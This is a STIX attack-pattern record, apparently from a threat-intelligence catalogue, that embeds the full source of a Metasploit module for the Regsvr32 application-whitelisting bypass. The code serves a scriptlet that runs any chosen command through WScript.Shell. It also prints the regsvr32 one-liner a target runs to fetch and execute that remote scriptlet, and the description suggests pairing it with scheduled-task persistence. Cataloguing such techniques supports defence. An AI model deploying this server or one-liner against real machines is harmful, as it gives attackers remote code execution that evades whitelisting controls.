{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2db5342-98df-4ab9-a9b0-5a78e68d63a1",
    "created": "2024-08-14T16:21:58.069125Z",
    "modified": "2024-08-14T16:21:58.069128Z",
    "name": "Regsvr32.exe (.sct) Command Delivery Server",
    "description": "( This module uses the Regsvr32.exe Application Whitelisting Bypass technique as a way to run a command on a target system. The major advantage of this technique is that you can execute a static command on the target system and dynamically and remotely change the command that will actually run (by changing the value of CMD). This is useful when combined with persistence methods (e.g., a recurring scheduled task) or when flexibility is needed through the use of a single command (e.g., as Rubber Ducky payload). ) 'License'      => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/regsvr32_command_delivery_server.rb",
            "external_id": "regsvr32_command_delivery_server.rb"
        },
        {
            "source_name": "reference",
            "url": "http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Regsvr32.exe (.sct) Command Delivery Server',\n      'Description'  => %q(\n        This module uses the Regsvr32.exe Application Whitelisting Bypass technique as a way to run a command on\n        a target system. The major advantage of this technique is that you can execute a static command on the target\n        system and dynamically and remotely change the command that will actually run (by changing the value of CMD).\n        This is useful when combined with persistence methods (e.g., a recurring scheduled task) or when flexibility\n        is needed through the use of a single command (e.g., as Rubber Ducky payload).\n      ),\n      'License'      => MSF_LICENSE,\n      'Author'       =>\n        [\n          'Casey Smith',  # AppLocker bypass research and vulnerability discovery (@subTee)\n          'Trenton Ivey', # MSF Module (kn0)\n          'mubix',        # Auxiliary module idea\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html']\n        ]\n    ))\n\n    register_options(\n      [\n        OptString.new('CMD',[false, 'The command to execute',''])\n      ])\n  end\n\n\n  def run\n    exploit\n  end\n\n\n  def primer\n    print_status(\"Run the following command on the target machine:\")\n    print_line(\"regsvr32 /s /n /u /i:#{get_uri} scrobj.dll\")\n  end\n\n  def on_request_uri(cli, _request)\n    print_status(\"Handling request from #{cli.peerhost}\")\n    data = gen_sct_file(datastore['CMD'])\n    send_response(cli, data, 'Content-Type' => 'text/plain')\n  end\n\n\n  def rand_class_id\n    \"#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}\"\n  end\n\n\n  def gen_sct_file(command)\n    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).\n    if command == ''\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"></registration></scriptlet>}\n    # If a command is provided, tell the target system to execute it.\n    else\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"><script><![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"#{command}\",0);]]></script></registration></scriptlet>}\n    end\n  end\nend\n"
}